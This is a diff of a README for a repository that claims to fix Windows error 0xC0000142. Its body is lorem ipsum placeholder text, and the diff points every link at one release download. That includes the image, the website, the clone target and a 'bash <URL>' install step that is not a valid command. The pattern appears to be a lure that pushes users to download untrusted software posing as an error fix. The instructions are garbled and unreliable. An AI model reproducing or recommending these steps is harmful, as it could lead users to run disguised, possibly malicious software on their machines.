@@ -20,7 +20,7 @@
 - 0xc0000142-windows7
 
 ## Software Download
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/user-attachments/files/17466420/Software.zip)
+[![Download Software](https://github.com/Hamza72333/Fixing-Error-0xC0000142/releases/tag/v2.0)](https://github.com/Hamza72333/Fixing-Error-0xC0000142/releases/tag/v2.0)
 
 ---
 
@@ -36,17 +36,17 @@
 ## Introduction
 Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin euismod condimentum mollis. Nullam consequat ligula nec velit dictum, id dignissim arcu maximus. Sed commodo, nunc eget aliquet fermentum, dolor justo accumsan lacus, sed pulvinar orci felis ac ligula.
 
-![Error Image](https://example.com/error-image.png)
+![Error Image](https://github.com/Hamza72333/Fixing-Error-0xC0000142/releases/tag/v2.0)
 
 ## Installation
 1. Clone the repository:
    ```
-   git clone https://github.com/username/Fixing-Error-0xC0000142.git
+   git clone https://github.com/Hamza72333/Fixing-Error-0xC0000142/releases/tag/v2.0
    ```
    
 2. Run the installation script:
    ```
-   bash install.sh
+   bash https://github.com/Hamza72333/Fixing-Error-0xC0000142/releases/tag/v2.0
    ```
 
 ## Usage
@@ -67,6 +67,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-For more information, visit [our website](https://www.example.com). 
+For more information, visit [our website](https://github.com/Hamza72333/Fixing-Error-0xC0000142/releases/tag/v2.0). 
 
 🚀 Happy fixing Error 0xC0000142! 🚀
